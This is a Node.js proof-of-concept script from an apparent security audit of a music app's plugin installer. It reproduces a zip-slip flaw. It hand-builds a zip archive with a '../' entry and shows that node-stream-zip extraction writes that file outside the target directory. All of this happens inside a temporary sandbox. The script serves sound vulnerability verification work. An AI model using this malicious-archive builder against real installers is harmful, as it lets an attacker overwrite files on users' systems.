#!/usr/bin/env node
/**
 * IMP-02 复现脚本：插件安装包解压路径穿越（zip-slip）。
 *
 * 复现目标（审计编号 IMP-02 / SEC-01）：
 *   src/main/plugins.ts 的 extractZipWithStreamZip() 只校验 entry.encrypted 与累计大小，
 *   随后直接 `zip.extract(null, extractDirectory)`，不校验 entry 名称。
 *   其依赖 node-stream-zip@1.16.0 在 node_stream_zip.js 中用
 *   `path.join(baseDir, file.name.replace(baseRelPath, ''))` 拼接落盘路径，同样不做净化。
 *
 * 因此一个含 `../` 或绝对路径 entry 的 zip，可把文件写到解压目录之外。
 *
 * 用法（仓库根目录）：
 *   node scripts/repro-zip-slip.cjs
 *
 * 退出码：
 *   0 = 已成功复现穿越（即漏洞存在，修复前应为 0）
 *   1 = 未复现（环境异常或依赖行为已变）
 *
 * 说明：本脚本只读 src/ 的既有行为，不修改任何仓库文件；所有临时文件写在系统临时目录。
 */

'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');

const ROOT = path.resolve(__dirname, '..');

// ── 最小 ZIP 构造器（stored 方法，无需第三方依赖）────────────────────────────

const crc32 = (buffer) => {
  if (typeof zlib.crc32 === 'function') return zlib.crc32(buffer) >>> 0;
  let crc = 0xffffffff;
  for (const byte of buffer) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) {
      crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1;
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
};

/** 用给定的 entry 名列表构造一个合法 ZIP 缓冲区。 */
const buildZip = (entries) => {
  const chunks = [];
  const central = [];
  let offset = 0;

  for (const entry of entries) {
    const nameBytes = Buffer.from(entry.name, 'utf8');
    const data = Buffer.from(entry.data ?? '', 'utf8');
    const crc = crc32(data);

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4); // version needed
    local.writeUInt16LE(0, 6); // flags
    local.writeUInt16LE(0, 8); // method = stored
    local.writeUInt16LE(0, 10); // mod time
    local.writeUInt16LE(0, 12); // mod date
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(data.length, 18); // compressed size
    local.writeUInt32LE(data.length, 22); // uncompressed size
    local.writeUInt16LE(nameBytes.length, 26);
    local.writeUInt16LE(0, 28); // extra length

    chunks.push(local, nameBytes, data);

    const dir = Buffer.alloc(46);
    dir.writeUInt32LE(0x02014b50, 0);
    dir.writeUInt16LE(20, 4); // version made by
    dir.writeUInt16LE(20, 6); // version needed
    dir.writeUInt16LE(0, 8); // flags
    dir.writeUInt16LE(0, 10); // method
    dir.writeUInt16LE(0, 12); // mod time
    dir.writeUInt16LE(0, 14); // mod date
    dir.writeUInt32LE(crc, 16);
    dir.writeUInt32LE(data.length, 20);
    dir.writeUInt32LE(data.length, 24);
    dir.writeUInt16LE(nameBytes.length, 28);
    dir.writeUInt16LE(0, 30); // extra
    dir.writeUInt16LE(0, 32); // comment
    dir.writeUInt16LE(0, 34); // disk start
    dir.writeUInt16LE(0, 36); // internal attrs
    dir.writeUInt32LE(0, 38); // external attrs
    dir.writeUInt32LE(offset, 42); // local header offset
    central.push(dir, nameBytes);

    offset += local.length + nameBytes.length + data.length;
  }

  const centralBuffer = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(0, 4);
  end.writeUInt16LE(0, 6);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(centralBuffer.length, 12);
  end.writeUInt32LE(offset, 16);
  end.writeUInt16LE(0, 20);

  return Buffer.concat([...chunks, centralBuffer, end]);
};

// ── 复现 ────────────────────────────────────────────────────────────────────

const main = async () => {
  const StreamZip = require(path.join(ROOT, 'node_modules', 'node-stream-zip'));

  const sandbox = fs.mkdtempSync(path.join(os.tmpdir(), 'yanmusic-zipslip-'));
  const extractDirectory = path.join(sandbox, 'extract');
  fs.mkdirSync(extractDirectory, { recursive: true });

  // 恶意包：一个正常文件 + 一个试图逃出解压目录的文件
  const escapedName = path.join('..', 'escaped-by-plugin.txt');
  const zipPath = path.join(sandbox, 'malicious-plugin.zip');
  fs.writeFileSync(
    zipPath,
    buildZip([
      { name: 'plugin.json', data: '{"id":"demo"}' },
      { name: escapedName, data: 'PWNED' },
    ]),
  );

  console.log('[repro] sandbox        =', sandbox);
  console.log('[repro] extract dir    =', extractDirectory);
  console.log('[repro] malicious zip  =', zipPath);
  console.log('[repro] escape target  =', path.join(sandbox, 'escaped-by-plugin.txt'));

  // 与 src/main/plugins.ts:1833-1856 的 extractZipWithStreamZip 完全同形的调用
  const zip = new StreamZip.async({ file: zipPath });
  try {
    const entries = await zip.entries();
    console.log('[repro] entries        =', Object.keys(entries).join(', '));
    await zip.extract(null, extractDirectory);
  } finally {
    await zip.close().catch(() => {});
  }

  const escapedPath = path.join(sandbox, 'escaped-by-plugin.txt');
  const escaped = fs.existsSync(escapedPath);
  const insideNormal = fs.existsSync(path.join(extractDirectory, 'plugin.json'));

  console.log('[repro] plugin.json extracted inside target dir =', insideNormal);
  console.log('[repro] escaped file written OUTSIDE target dir  =', escaped);
  if (escaped) {
    console.log('[repro] escaped content =', JSON.stringify(fs.readFileSync(escapedPath, 'utf8')));
  }

  fs.rmSync(sandbox, { recursive: true, force: true });

  if (escaped) {
    console.log('\n[repro] RESULT: REPRODUCED — 解压可写出目标目录之外（漏洞存在）');
    process.exit(0);
  }
  console.log('\n[repro] RESULT: NOT REPRODUCED — 未观察到越界写入');
  process.exit(1);
};

main().catch((error) => {
  console.error('[repro] ERROR', error);
  process.exit(1);
});
